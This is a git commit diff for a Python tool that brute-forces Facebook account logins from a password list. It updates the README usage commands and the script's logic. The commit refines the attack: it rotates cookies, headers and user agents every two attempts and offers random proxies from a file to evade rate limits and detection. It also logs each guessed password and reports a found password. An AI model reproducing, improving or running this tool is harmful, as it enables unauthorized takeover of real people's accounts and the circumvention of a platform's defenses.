e7de32bf7bfeb1f91362289d4319b87462895c4d
Primo <44984918+m-primo@users.noreply.github.com>
2021-12-08 04:43:53 +0200

    added operation time, using proxies become optional, separated the use agents and the proxies into files, and more

--- README.md
+++ README.md
@@ -7,7 +7,7 @@ This script will do login brute force in Facebook with a list of passwords.
 2. Easy code.
 3. Colored Texts.
 4. Using the fastest host in Facebook.
-5. Cookies and headers will change every 4-5 attempts.
+5. Cookies and headers will change every 2 attempts.
 6. A random proxy every attempt.
 
 
@@ -18,7 +18,7 @@ This script will do login brute force in Facebook with a list of passwords.
 # Installation
 First, you'll need to have:
 1. [Python 3](https://www.python.org/downloads/)
-2. pip
+2. [pip](https://pip.pypa.io/en/stable/installation/#get-pip-py)
 
 Once that's all set up:
 
@@ -30,30 +30,38 @@ Once that's all set up:
 # Run
 - Using arguments:
 ```bash
-python app.py -u <USERNAME/ID/EMAIL/PHONE> -p <PASSWORD_LIST_FILENAME> -l <LOG_FILE_NAME>
+python app.py -u <USERNAME/ID/EMAIL/PHONE> -p <PASSWORD_LIST_FILENAME>
 ```
 - To use a single password:
 ```bash
-python app.py -u <USERNAME/ID/EMAIL/PHONE> -sp <PASSWORD> -l <LOG_FILE_NAME>
+python app.py -u <USERNAME/ID/EMAIL/PHONE> -sp <PASSWORD>
 ```
--> You can ignore the `-l` (log) argument.
+- All arguments
+```bash
+python app.py -u <USERNAME/ID/EMAIL/PHONE> -p <PASSWORD_LIST_FILENAME> -l <LOG_FILE_NAME> --use-proxy
+```
+-> the `-l` (log) argument and `--use-proxy` are optional.
 - To get the help message:
 ```bash
 python app.py -h
 ```
-- Or you can just run the app and it'll ask you with the inputs:
+- Or you can just run the app and it'll ask you with the inputs (proxies disabled by default in this method, unless of course if you type `--use-proxy`):
 ```bash
 python app.py
+```
+- To use the proxies (a random proxy from the proxies file `proxies.txt`):
+```bash
+--use-proxy
 ```
 
 
 # Contributing
 1. [Fork this repository](https://github.com/m-primo/Facebook-Brute-Force/fork).
-2. Clone your repository.
+2. Clone your repository, replace `[your_repo]` with your repositiory URL.
 ```bash
 git clone [your_repo]
 ```
-3. Make & commit your changes.
+3. Make & commit your changes, replace `[message]` with your commit message.
 ```bash
 git commit -m "[message]"
 ```
--- app.py
+++ app.py
@@ -16,64 +16,14 @@ class CliColors:
 # =============> Config <=============
 MIN_PASSWORD_LENGTH = 6 # minimum length of the facebook password
 MAIN_FB_DOMAIN = 'https://mbasic.facebook.com'
-LOGIN_URL = MAIN_FB_DOMAIN+'/login.php' #TODO: ?login_attempt=1
-USER_AGENTS = [
-    'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
-    'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
-    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
-    'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1'
-]
-PROXIES = [
-    'http://10.10.1.10:3128',
-    'http://77.232.139.200:8080',
-    'http://78.111.125.146:8080',
-    'http://77.239.133.146:3128',
-    'http://74.116.59.8:53281',
-    'http://67.53.121.67:8080',
-    'http://67.78.143.182:8080',
-    'http://62.64.111.42:53281',
-    'http://62.210.251.74:3128',
-    'http://62.210.105.103:3128',
-    'http://5.189.133.231:80',
-    'http://46.101.78.9:8080',
-    'http://45.55.86.49:8080',
-    'http://40.87.66.157:80',
-    'http://45.55.27.246:8080',
-    'http://45.55.27.246:80',
-    'http://41.164.32.58:8080',
-    'http://45.125.119.62:8080',
-    'http://37.187.116.199:80',
-    'http://43.250.80.226:80',
-    'http://43.241.130.242:8080',
-    'http://38.64.129.242:8080',
-    'http://41.203.183.50:8080',
-    'http://36.85.90.8:8080',
-    'http://36.75.128.3:80',
-    'http://36.81.255.73:8080',
-    'http://36.72.127.182:8080',
-    'http://36.67.230.209:8080',
-    'http://35.198.198.12:8080',
-    'http://35.196.159.241:8080',
-    'http://35.196.159.241:80',
-    'http://27.122.224.183:80',
-    'http://223.206.114.195:8080',
-    'http://221.120.214.174:8080',
-    'http://223.205.121.223:8080',
-    'http://222.124.30.138:80',
-    'http://222.165.205.204:8080',
-    'http://217.61.15.26:80',
-    'http://217.29.28.183:8080',
-    'http://217.121.243.43:8080',
-    'http://213.47.184.186:8080',
-    'http://207.148.17.223:8080',
-    'http://210.213.226.3:8080',
-    'http://202.70.80.233:8080',
-]
+LOGIN_URL = MAIN_FB_DOMAIN+'/login.php'
+DEFAULT_TIMEOUT = 2 # request timeout in seconds
+USER_AGENTS = []
+with open('user-agents.txt', 'rt', newline='', encoding='utf-8') as file:
+    USER_AGENTS = file.read().splitlines()
+PROXIES = []
+with open('proxies.txt', 'rt', newline='', encoding='utf-8') as file:
+    PROXIES = file.read().splitlines()
 PAYLOAD = {}
 COOKIES = {}
 HEADERS = {}
@@ -127,7 +77,7 @@ def get_random_headers():
         'origin': MAIN_FB_DOMAIN
     }
 
-def form_data():
+def form_data(use_proxy=False):
     form = {}
     cookies = {
         'wd': '1366x663',
@@ -135,10 +85,13 @@ def form_data():
         'locale': 'en_US'
     }
     headers = get_random_headers()
-    random_proxy = random.choice(PROXIES)
-    proxy = {'http': random_proxy}
+    if use_proxy:
+        random_proxy = random.choice(PROXIES)
+        proxy = {'http': random_proxy}
+    else:
+        proxy = None
 
-    data = requests.get(LOGIN_URL, headers=headers, proxies=proxy)
+    data = requests.get(LOGIN_URL, headers=headers, proxies=proxy, timeout=DEFAULT_TIMEOUT)
     for i in data.cookies:
         cookies[i.name] = i.value
 
@@ -149,25 +102,26 @@ def form_data():
 
     return form, cookies
 
-def Login(user, password, index=1):
+def Login(user, password, index=1, use_proxy=False):
     global PAYLOAD, COOKIES, HEADERS
-    if index % 5 == 0:
-        PAYLOAD, COOKIES = form_data()
+    if len(PAYLOAD) < 1 or len(COOKIES) < 1:
+        PAYLOAD, COOKIES = form_data(use_proxy)
+    if len(HEADERS) < 1:
         HEADERS = get_random_headers()
-    else:
-        if len(PAYLOAD) < 1 or len(COOKIES) < 1:
-            PAYLOAD, COOKIES = form_data()
-        if len(HEADERS) < 1:
-            HEADERS = get_random_headers()
+    if index % 2 == 0:
+        PAYLOAD, COOKIES = form_data(use_proxy)
+        HEADERS = get_random_headers()
     PAYLOAD['email'] = user
     PAYLOAD['pass'] = password
     random_proxy = random.choice(PROXIES)
-    PROXY = {'http': random_proxy}
-    r = requests.post(LOGIN_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS, proxies=PROXY)
+    if use_proxy:
+        PROXY = {'http': random_proxy}
+    else:
+        PROXY = None
+    r = requests.post(LOGIN_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS, proxies=PROXY, timeout=DEFAULT_TIMEOUT)
     rurl = r.url.lower()
     rtext = r.text.lower()
-    # if '/login/save-device' in rurl or '/checkpoint' in rurl or MAIN_FB_DOMAIN == rurl or '/home' in rurl or 'log out' in rtext or 'find friends' in rtext or 'search' in rtext:
-    if 'logout' in rtext or 'log out' in rtext: #TODO: not 'login_attempt' in rurl
+    if 'logout' in rtext or 'log out' in rtext:
         return [True, password]
     return [False, password]
 # =============> Arguments <=============
@@ -177,7 +131,9 @@ def args():
     parser.add_argument('-u', '--user', help='Email/Username/ID/Phone')
     parser.add_argument('-p', '--password-list', help='Password List Filename')
     parser.add_argument('-sp', '--single-password', help='Password')
+    parser.add_argument('--use-proxy', action='store_true', help='Use Proxies')
     parser.add_argument('-l', '--log', help='Log Filename')
+    parser.set_defaults(use_proxy=False)
     return parser.parse_args()
 # =============> Main <=============
 def main(args=None):
@@ -221,24 +177,31 @@ def main(args=None):
     print("")
     print(CliColors.OKCYAN+"[*] Processing...")
 
+    start_time = time.time()
     flag = [False, None]
     index = 1
     for password in passwords:
-        password = password.strip()
-        if len(password) < MIN_PASSWORD_LENGTH:
-            _log.write_colored("[!] Password '{}' is less than {} characters and has been ignored.".format(password, MIN_PASSWORD_LENGTH), 'grey')
-            continue
-        _log.write_colored("[*] Attempt #{} with user: '{}' and password: '{}'.".format(index, user, password), 'yellow')
-        LoginOp = Login(user, password, index)
-        if LoginOp[0]:
-            flag = LoginOp
-            break
+        try:
+            password = password.strip()
+            if len(password) < MIN_PASSWORD_LENGTH:
+                _log.write_colored("[!] Password '{}' is less than {} characters and has been ignored.".format(password, MIN_PASSWORD_LENGTH), 'grey')
+                continue
+            _log.write_colored("[*] Attempt #{} with user: '{}' and password: '{}'{}.".format(index, user, password, ' Using Proxy' if args.use_proxy is True else ''), 'yellow')
+            LoginOp = Login(user, password, index, args.use_proxy)
+            if LoginOp[0]:
+                flag = LoginOp
+                break
+        except Exception as ex:
+            _log.write_colored("[!] Caught an Exception: {}".format(str(ex)), 'yellow')
         index += 1
+    end_time = time.time() - start_time
+
     if flag[0]:
         _log.write_colored("[+] Password Found: '{}'.".format(flag[1]), 'green')
     else:
         _log.write_colored("[-] No Password was Found.", 'red')
-    # TODO: time
+    
+    _log.write_colored("Took {} seconds to complete this operation.".format(str(round(end_time, 2))), 'magenta')
     print("")
 
 if __name__ == '__main__':
